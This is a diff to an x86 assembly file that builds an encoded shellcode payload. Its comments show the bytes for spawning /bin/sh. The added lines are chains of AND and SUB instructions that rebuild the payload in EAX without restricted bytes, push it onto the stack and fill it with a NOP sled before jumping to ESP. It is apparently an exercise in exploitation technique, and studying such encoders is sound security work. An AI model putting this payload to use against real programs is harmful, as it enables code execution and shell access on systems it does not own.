@@ -1,7 +1,7 @@
 global _start
 	_start:
 		;========================
-		; \x31
+		; \x90\x90\x90\x31
 		; \xc9\x51\x68\x2f
 		; \x2f\x73\x68\x68
 		; \x2f\x62\x69\x6e
@@ -25,8 +25,9 @@ global _start
 		; set $eax = 0
 		and eax, 49494949H
 		and eax, 30303030H
-		sub eax, 0x41254130H
-		sub eax 
+sub eax, 8d776680H
+sub eax, 8d776680H
+sub eax, 8c776580H
 		push eax
 		
 		;========================
@@ -35,7 +36,9 @@ global _start
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-
+sub eax, 7d628752H
+sub eax, 7c5d8752H
+sub eax, 7c5c8751H
 		push eax
 		
 		;========================
@@ -44,7 +47,9 @@ global _start
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-
+sub eax, 9b8a8786H
+sub eax, 9a898786H
+sub eax, 9a898786H
 		push eax
 		;========================
 		;  set $eax = shellcode[-16:-12]
@@ -52,6 +57,9 @@ global _start
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
+sub eax, 9b848888H
+sub eax, 9a848788H
+sub eax, 9a838788H
 		push eax
 		
 		;========================
@@ -60,22 +68,28 @@ global _start
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-		
+		sub eax, 678f889bH
+		sub eax, 678f879bH
+		sub eax, 678f879bH
 		push eax
 		;========================
 		;  set $eax = shellcode[-21:-20]
-		; \x00\x00\x00\x31
+		; \x90\x90\x90\x31
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-
+sub eax, 7a7a7a9bH
+sub eax, 7a7a7a9aH
+sub eax, 7a7a7a9aH
 		push eax
 		;========================
 		;  set $eax = \x90\x90\x90\x90 (nop)
 		;========================
 		and eax, 49494949H
 		and eax, 30303030H
-
+sub eax, 7a7a7a7bH
+sub eax, 7a7a7a7bH
+sub eax, 7a7a7a7aH
 		push eax
 		;========================
 		; fill pad with nop ; then $eip = $esp
